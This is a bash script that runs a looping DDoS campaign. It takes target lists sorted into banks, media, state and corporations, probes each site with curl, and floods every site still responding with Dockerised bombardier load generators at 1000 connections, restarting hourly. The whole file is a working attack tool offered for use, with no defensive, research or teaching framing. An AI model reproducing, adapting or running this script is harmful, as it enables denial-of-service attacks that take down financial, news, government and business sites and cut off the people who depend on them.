#!/bin/bash

BOMBARDIER_TIMEOUT=600000s
BOMBARDIER_CONNECTIONS=1000

categories=("banks" "media" "state" "corporations" "unsorted")
category=$1

if [ ! -f targets.txt ]
then
  touch targets.txt
else
  > targets.txt
fi

if [ $# -eq 0 ]
then
  echo "Run ddos for all sites"
  cat targets/*.txt >> targets.txt
else
  if [[ " ${categories[@]} " =~ " ${category} " ]]; then
    echo "Run ddos for $1"
  else
    echo "This category is not allowed. Choose from:"
    printf '%s\n' "${categories[@]}"
    exit 0
  fi

  cat targets/${category}.txt >> targets.txt
fi

sites=()
while IFS= read -r line; do
  sites+=("$line")
done < targets.txt

while :
do
  echo "Stop all containers"

  docker stop $(docker ps -aq)

  echo "Docker containers stopped"

  for site in "${sites[@]}"; do
    status_code=$(curl -m 2 -o /dev/null -s -w "%{http_code}\n" "$site")
    status_code=$(expr "$status_code" + 0)

    # If status code is zero site is already blocked
    site_status="${site} status code ${status_code}"

    echo "$site_status"

    if (("$status_code" != 0 && "$status_code" <= 400)); then
      echo "Must be destroyed"
      docker run -ti -d --rm alpine/bombardier -c "$BOMBARDIER_CONNECTIONS" -d "$BOMBARDIER_TIMEOUT" -l "$site"
    fi
  done

  echo "DDoS is up and running..."

  sleep 1h

  echo "Restarting DDoS, checking which sites are still working"
done
